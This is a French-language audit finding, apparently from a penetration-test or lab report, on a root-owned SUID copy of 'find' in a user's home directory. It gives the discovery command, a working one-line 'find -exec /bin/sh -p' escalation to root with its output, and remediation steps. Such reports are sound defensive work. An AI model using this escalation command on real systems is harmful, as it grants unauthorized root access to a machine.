# VULN-08 — SUID find Privilege Escalation

**Sévérité :** CRITIQUE (CVSS 9.3)
**OWASP :** A01:2021 Broken Access Control
**CWE :** CWE-250 Execution with Unnecessary Privileges / CWE-732 Incorrect Permission Assignment
**Vecteur :** /home/bob/find (bit SUID actif, propriétaire root)

---

## Description

Le binaire `find` présent dans le répertoire de Bob possède le bit SUID avec root comme propriétaire. Le bit SUID permet à n'importe quel utilisateur d'exécuter ce programme avec les droits de son propriétaire (root). Or, `find` supporte l'option `-exec` qui permet d'exécuter des commandes arbitraires.

---

## Découverte

Depuis le compte alice, recherche de tous les binaires SUID :

```bash
find / -perm -4000 -type f 2>/dev/null
```

Résultat (extrait) :

```
/usr/bin/umount
/usr/bin/su
/usr/bin/sudo
/home/bob/find    <-- anormal, hors /usr
```

Le binaire `/home/bob/find` sort du lot : il se trouve dans un répertoire utilisateur, ce qui est atypique pour un binaire SUID légitime.

---

## Exploitation

```bash
# Exécution de /bin/sh avec les droits root via find -exec
/home/bob/find . -exec /bin/sh -p \; -quit
```

`-p` : preserve les droits effectifs (EUID root)

Résultat :

```
# whoami
root
# id
uid=1000(alice) gid=1000(alice) euid=0(root) groups=1000(alice)
```

Accès root obtenu en une seule commande.

---

## Impact

Accès root depuis n'importe quel compte utilisateur du serveur. Troisième chemin indépendant vers root, confirmant la profondeur de la surface d'attaque.

**Impact GRC :** Violation CWE-250. Contrôle A.8.2 ISO 27001:2022 non respecté. Un binaire SUID en dehors de /usr/bin ou /usr/sbin est un signal d'alarme systématique lors d'un audit.

---

## Remédiation

```bash
# Retrait immédiat du bit SUID
chmod -s /home/bob/find

# Vérification
ls -la /home/bob/find
# -rwxr-xr-x (plus de s)

# Audit régulier à mettre en crontab (surveillance)
find / -perm -4000 -type f 2>/dev/null > /var/log/suid_audit_$(date +%Y%m%d).txt
diff /var/log/suid_audit_baseline.txt /var/log/suid_audit_$(date +%Y%m%d).txt
```

---

## Références

* [GTFOBins find](https://gtfobins.github.io/gtfobins/find/)
* [CWE-250](https://cwe.mitre.org/data/definitions/250.html)
* [CWE-732](https://cwe.mitre.org/data/definitions/732.html)

**MITRE ATT&CK :** T1548.001 Setuid and Setgid, TA0004 Privilege Escalation
